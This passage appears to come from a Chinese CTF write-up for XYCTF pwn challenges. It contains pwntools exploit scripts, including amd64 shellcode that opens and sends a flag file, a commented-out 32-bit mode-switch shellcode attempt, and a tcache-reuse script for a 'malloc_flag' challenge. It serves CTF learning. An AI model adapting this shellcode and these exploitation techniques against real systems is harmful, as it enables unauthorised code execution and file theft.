<span class="token comment"># jmp copy_loop</span>
<span class="token comment"># end_copy:       </span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;amd64&quot;)</span>
file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span><span class="token number">35002</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+181&quot;)</span>
<span class="token comment"># b 0x114514061 </span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *0x114514061&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># ru(b&quot;show your magic again\\n&quot;)</span>
<span class="token comment"># # retfq 等效为</span>
<span class="token comment"># # pop IP</span>
<span class="token comment"># # pop CS</span>

<span class="token comment"># # retfq无法跳转4字节以上的地址</span>

<span class="token comment"># # 尝试fork一个新进程</span>
<span class="token comment"># # puts函数</span>
<span class="token comment"># # 0x114514000</span>
<span class="token comment"># # \\x00 \\x40 \\x51 \\x13  cs:\\x01</span>

<span class="token comment"># # eip rip cs:ip</span>
<span class="token comment"># # retfq -&gt;cs位0x23 ip</span>

<span class="token comment"># # mov rax,[rbp+24]</span>
<span class="token comment"># # add rax,80</span>
<span class="token comment"># # jmp rax</span>
<span class="token comment"># # 0x11451404d -&gt;0x14514000 57次</span>
<span class="token comment"># # </span>

<span class="token comment"># # b *0x114514061 </span>

<span class="token comment"># shellcode = asm(&#39;&#39;&#39;</span>
<span class="token comment"># mov r9d,0x0</span>
<span class="token comment"># mov r8d,0xffffffff</span>
<span class="token comment"># mov ecx,0x22</span>
<span class="token comment"># mov edx,0x7</span>
<span class="token comment"># mov esi,0x1000</span>
<span class="token comment"># movabs rax,0x14514000</span>
<span class="token comment"># mov rdi,rax </span>
<span class="token comment"># mov rax,[rbp+24]</span>
<span class="token comment"># sub rax,647</span>
<span class="token comment"># call rax</span>
<span class="token comment"># &#39;&#39;&#39;,arch=&quot;amd64&quot;)</span>
<span class="token comment"># # 将内容赋值过去</span>

<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov rsi,0x11451406a; </span>
<span class="token comment"># mov rdi,0x14514000;</span>
<span class="token comment"># mov rcx,456     </span>

<span class="token comment"># copy_loop:</span>
<span class="token comment">#   cmp rcx, 0</span>
<span class="token comment">#   je end_copy                 ; </span>
<span class="token comment">#   mov al, [rsi]               ; </span>
<span class="token comment">#   mov [rdi], al               ; </span>
<span class="token comment">#   inc rsi                     ; </span>
<span class="token comment">#   inc rdi                     ; </span>
<span class="token comment">#   dec rcx                     ; </span>
<span class="token comment">#   jmp copy_loop               ; </span>

<span class="token comment"># end_copy:</span>
<span class="token comment">#     mov rax,0x14514000</span>
<span class="token comment">#     jmp rax</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;amd64&quot;)</span>
<span class="token comment"># # 转化为32位</span>
<span class="token comment"># shellcode +=asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># push 0x23</span>
<span class="token comment"># push 0x14514009</span>
<span class="token comment"># retfq</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;amd64&quot;)</span>
<span class="token comment"># # 构造栈</span>
<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov esp,0x14514400</span>
<span class="token comment"># mov ebp,0x14514420</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;i386&quot;)</span>
<span class="token comment"># # 调用open函数</span>
<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># xor eax, eax ; </span>
<span class="token comment"># mov eax,0x5 ;</span>
<span class="token comment"># push 0x00006761;</span>
<span class="token comment"># push 0x6c662f2e;</span>
<span class="token comment"># mov ebx,esp;</span>
<span class="token comment"># mov edi,esp; </span>
<span class="token comment"># mov ecx, 0;  </span>
<span class="token comment"># int 0x80; </span>
<span class="token comment"># &#39;&#39;&#39;,arch=&quot;i386&quot;)</span>
<span class="token comment"># # read</span>
<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov ebx,3;</span>
<span class="token comment"># mov ecx,esp;</span>
<span class="token comment"># mov edx,0x20;</span>
<span class="token comment"># mov eax,0x3;</span>
<span class="token comment"># int 0x80;</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;i386&quot;)</span>
<span class="token comment"># # write</span>
<span class="token comment"># shellcode +=asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov ebx,1;</span>
<span class="token comment"># mov ecx,esp;</span>
<span class="token comment"># mov edx,0x20;</span>
<span class="token comment"># mov eax,0x4;</span>
<span class="token comment"># int 0x80;</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;i386&quot;)</span>


<span class="token comment"># payload = shellcode</span>

<span class="token comment"># payload = payload.ljust(0x160,b&#39;\\x00&#39;)</span>
<span class="token comment"># payload += b&quot;\\x00\\x00./flag\\x00\\x00\\x00&quot;</span>
<span class="token comment"># print(payload)</span>
<span class="token comment"># sd(payload)</span>
<span class="token comment"># ru(b&quot;show your magic again\\n&quot;)</span>
<span class="token comment"># shellcode= asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># push 0x23    </span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># )</span>
<span class="token comment"># ia()</span>
<span class="token comment"># print(len(asm(shellcode,arch=&#39;amd64&#39;)</span>

ru<span class="token punctuation">(</span><span class="token string">b&quot;show your magic again\\n&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># read函数 and sendfile函数</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">&#39;&#39;&#39;
mov rax, 0x67616c662f2e
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
xor edx, edx
xor r10, r10
push 0x101
pop rax
syscall

mov rdi, 1
mov rsi, 3
push 0
mov rdx, rsp
mov r10, 0x100
push 0x28
pop rax
syscall

mov rax,1

&#39;&#39;&#39;</span>
<span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">&quot;amd64&quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;}&quot;</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="malloc-flag" tabindex="-1"><a class="header-anchor" href="#malloc-flag" aria-hidden="true">#</a> malloc_flag</h2><blockquote><p>不懂为什么这题就只有30多解</p></blockquote><ul><li>读取了flag而且写入了chunk中再把chunk free了 这个free chunk就进入了tcache 我们直接malloc一个大小一样的chunk 然后输出 就可以获取flag</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
port <span class="token operator">=</span> <span class="token number">52689</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+516&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">recv_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># 请输入名字:</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># 请输入大小 (十进制或十六进制):</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">displayChunks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">displayChunk</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;4&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># 请输入要查看内容的内存块名字:</span>
    ru<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> displayChunk<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
